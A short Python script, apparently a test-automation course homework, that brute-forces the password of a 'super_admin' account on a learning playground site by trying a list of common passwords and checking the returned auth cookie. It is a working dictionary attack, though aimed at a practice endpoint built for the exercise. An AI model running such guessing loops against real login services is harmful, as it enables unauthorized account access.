import requests

password_lst = ["password", "123456", "12345678", "12345", "123456789", "qwerty", "abc123", "football", "1234567",
                "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou",
                "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin", "solo", "1q2w3e4r", "master",
                "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321",
                "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael",
                "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie",
                "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman",
                "zaq1zaq1", "Football", "000000", "123qwe", "qwerty123"]

for i in range(len(password_lst)):
    payload = {
        "login": "super_admin",
        "password": password_lst[i]
    }
    response_check_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                        data=payload)
    cookies = dict(response_check_pass.cookies)
    response_check_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response_check_cookie.text == "You are authorized":
        print(response_check_cookie.text)
        print(password_lst[i])
        break
    else:
        print("ERROR")
